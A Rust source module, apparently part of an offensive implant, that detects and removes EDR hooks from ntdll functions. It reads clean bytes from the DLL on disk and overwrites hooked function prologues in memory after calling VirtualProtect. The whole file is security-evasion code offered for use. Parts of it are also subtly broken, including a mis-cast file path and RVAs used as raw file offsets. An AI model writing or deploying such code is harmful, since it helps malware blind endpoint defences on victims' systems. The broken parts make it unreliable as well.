// API Unhooking
// Removes EDR hooks by restoring original function bytes

use crate::api_resolver::get_export_address;
use std::ffi::CString;
use std::ptr;
use winapi::shared::minwindef::*;
use winapi::um::fileapi::*;
use winapi::um::libloaderapi::*;
use winapi::um::memoryapi::*;
use winapi::um::winnt::*;

/// Check if function is hooked
pub unsafe fn is_function_hooked(function_address: *mut winapi::ctypes::c_void) -> bool {
    if function_address.is_null() {
        return false;
    }

    let bytes = std::slice::from_raw_parts(function_address as *const u8, 16);

    // Check for JMP instruction (0xE9 = near JMP, 0xFF 0x25 = far JMP)
    if bytes[0] == 0xE9 || (bytes[0] == 0xFF && bytes[1] == 0x25) {
        return true; // Hooked
    }

    // Check for common hook patterns
    // Some EDRs use: mov rax, <address>; jmp rax
    if bytes[0] == 0x48 && bytes[1] == 0xB8 {
        // mov rax, <64-bit address>
        return true;
    }

    false
}

/// Get original function bytes from disk
pub unsafe fn get_original_bytes_from_disk(
    module_name: &str,
    function_name: &str,
) -> Option<Vec<u8>> {
    // Get module path
    let module_cstr = CString::new(module_name).unwrap();
    let module_handle = GetModuleHandleA(module_cstr.as_ptr() as *const i8);
    if module_handle.is_null() {
        return None;
    }

    // Get module file path
    let mut module_path = [0u16; 260];
    let len = GetModuleFileNameW(
        module_handle,
        module_path.as_mut_ptr(),
        module_path.len() as u32,
    );

    if len == 0 {
        return None;
    }

    // Convert to string
    let path_str: String = String::from_utf16_lossy(&module_path[..len as usize]);

    // Read file from disk
    let file_cstr = CString::new(path_str).unwrap();
    let file_handle = CreateFileW(
        file_cstr.as_ptr() as *const u16,
        GENERIC_READ,
        FILE_SHARE_READ,
        ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );

    if file_handle == winapi::um::handleapi::INVALID_HANDLE_VALUE {
        return None;
    }

    // Read file into memory
    let file_size = GetFileSize(file_handle, ptr::null_mut()) as usize;
    let mut file_data = vec![0u8; file_size];
    let mut bytes_read = 0u32;

    ReadFile(
        file_handle,
        file_data.as_mut_ptr() as *mut winapi::ctypes::c_void,
        file_size as u32,
        &mut bytes_read,
        ptr::null_mut(),
    );

    winapi::um::handleapi::CloseHandle(file_handle);

    if bytes_read == 0 {
        return None;
    }

    // Parse PE and find function
    let module_base = file_data.as_mut_ptr();
    if let Some(func_rva) = get_export_address_from_bytes(module_base, function_name) {
        // Read original function bytes (first 16 bytes should be enough)
        let func_offset = func_rva as usize;
        if func_offset + 16 <= file_data.len() {
            return Some(file_data[func_offset..func_offset + 16].to_vec());
        }
    }

    None
}

/// Get export address from PE bytes (helper)
unsafe fn get_export_address_from_bytes(
    module_base: *mut u8,
    function_name: &str,
) -> Option<*const winapi::ctypes::c_void> {
    // Similar to api_resolver::get_export_address but works on file bytes
    let dos_header = module_base as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let pe_offset = (*dos_header).e_lfanew as usize;
    let nt_headers = module_base.add(pe_offset) as *const IMAGE_NT_HEADERS64;

    #[cfg(target_arch = "x86")]
    let nt_headers = module_base.add(pe_offset) as *const IMAGE_NT_HEADERS32;

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    #[cfg(target_arch = "x86_64")]
    let export_rva = (*(&(*nt_headers).OptionalHeader as *const IMAGE_OPTIONAL_HEADER64))
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize]
        .VirtualAddress as usize;

    #[cfg(target_arch = "x86")]
    let export_rva = (*(&(*nt_headers).OptionalHeader as *const IMAGE_OPTIONAL_HEADER32))
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize]
        .VirtualAddress as usize;

    if export_rva == 0 {
        return None;
    }

    let export_dir = module_base.add(export_rva) as *const IMAGE_EXPORT_DIRECTORY;
    let name_rva = (*export_dir).AddressOfNames as usize;
    let name_ordinals_rva = (*export_dir).AddressOfNameOrdinals as usize;
    let functions_rva = (*export_dir).AddressOfFunctions as usize;
    let num_names = (*export_dir).NumberOfNames as usize;

    for i in 0..num_names {
        let name_ptr = module_base.add(*(module_base.add(name_rva) as *const u32).add(i) as usize)
            as *const i8;

        let mut j = 0;
        let func_name_bytes = function_name.as_bytes();
        loop {
            let name_byte = *name_ptr.add(j);
            if name_byte == 0 && j >= func_name_bytes.len() {
                let ordinal = *(module_base.add(name_ordinals_rva) as *const u16).add(i) as usize;
                let func_rva =
                    *(module_base.add(functions_rva) as *const u32).add(ordinal) as usize;
                return Some(module_base.add(func_rva) as *const winapi::ctypes::c_void);
            }
            if j >= func_name_bytes.len() || name_byte != func_name_bytes[j] as i8 {
                break;
            }
            j += 1;
        }
    }

    None
}

/// Unhook a function by restoring original bytes
pub unsafe fn unhook_function(module_name: &str, function_name: &str) -> Result<(), String> {
    // Get current function address
    let func_addr = crate::api_resolver::resolve_api(module_name, function_name)
        .ok_or_else(|| format!("Failed to resolve {}", function_name))?;

    // Check if hooked
    if !is_function_hooked(func_addr) {
        return Ok(()); // Not hooked, nothing to do
    }

    // Get original bytes from disk
    let original_bytes = get_original_bytes_from_disk(module_name, function_name)
        .ok_or_else(|| format!("Failed to get original bytes for {}", function_name))?;

    // Change memory protection
    let mut old_protect = 0u32;
    if VirtualProtect(
        func_addr,
        original_bytes.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    ) == 0
    {
        return Err("Failed to change memory protection".to_string());
    }

    // Write original bytes
    ptr::copy_nonoverlapping(
        original_bytes.as_ptr(),
        func_addr as *mut u8,
        original_bytes.len(),
    );

    // Restore protection
    let mut _dummy = 0u32;
    VirtualProtect(func_addr, original_bytes.len(), old_protect, &mut _dummy);

    Ok(())
}

/// Unhook common ntdll functions
pub unsafe fn unhook_ntdll() -> Result<(), String> {
    let functions = [
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtCreateThreadEx",
        "NtQueryInformationProcess",
    ];

    for func in &functions {
        if let Err(e) = unhook_function("ntdll.dll", func) {
            // Continue with other functions even if one fails
            continue;
        }
    }

    Ok(())
}
